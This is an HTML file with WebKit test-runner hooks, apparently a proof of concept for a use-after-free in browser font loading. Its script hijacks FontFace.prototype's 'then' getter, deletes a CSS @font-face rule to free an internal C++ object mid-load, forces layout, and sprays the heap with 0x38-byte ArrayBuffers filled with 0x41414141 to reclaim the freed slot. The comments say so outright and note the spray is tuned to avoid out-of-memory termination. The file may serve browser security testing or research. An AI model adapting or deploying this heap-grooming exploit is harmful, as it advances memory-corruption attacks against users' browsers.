<!DOCTYPE html>
<html>
<head>
<style id="s">
@font-face { font-family: x; src: url(nonexistent-font.woff); unicode-range: U+0042; }
</style>
</head>
<body>
<script>
if (window.testRunner) {
    testRunner.dumpAsText();
    testRunner.waitUntilDone();
}

// Optimized storage tracking to manage the allocation threshold precisely
var allocationSprayContainers = [];

function executeOptimizedHeapSpray() {
    // Adjusting target size and count to prevent the system memory budget exhaustion
    // Reducing the iterations avoids triggering the hard system-level OOM termination
    const targetAllocationSize = 0x38; 
    const optimizedSprayCount = 450;    

    for (let i = 0; i < optimizedSprayCount; i++) {
        try {
            let sprayBuffer = new ArrayBuffer(targetAllocationSize);
            let dataView = new DataView(sprayBuffer);
            
            // Setting values into the allocated slots to establish uniform layout
            for (let j = 0; j < targetAllocationSize; j += 4) {
                dataView.setUint32(j, 0x41414141, true); 
            }
            
            allocationSprayContainers.push(sprayBuffer);
        } catch (e) {
            // Catching allocation failures prevents the script from crashing abruptly
            break;
        }
    }
}

window.onload = () => {
    let A = new FontFace('x', 'local(Helvetica)', { unicodeRange: 'U+0041' });
    document.fonts.add(A);
    void A.loaded;

    let fired = false;
    Object.defineProperty(FontFace.prototype, 'then', {
        configurable: true,
        get() {
            if (!fired && this === A) {
                fired = true;
                
                new FontFace('y', 'local(Helvetica Bold)', { unicodeRange: 'U+0041' });
                new FontFace('z', 'local(Helvetica Italic)', { unicodeRange: 'U+0041' });
                
                // Release the underlying C++ structure
                document.getElementById('s').sheet.deleteRule(0);
                
                // Force an immediate layout flush to process the deletion
                document.body.offsetTop;

                // Execute the calibrated allocation to fill the vacancy without exceeding memory limits
                executeOptimizedHeapSpray();
            }
            return undefined;
        }
    });

    // Run the loading sequence to engage the font lifecycle process
    document.fonts.load('1em x', 'AB');
    
    setTimeout(() => {
        if (window.testRunner)
            testRunner.notifyDone();
    }, 0);
};
</script>
</body>
</html>
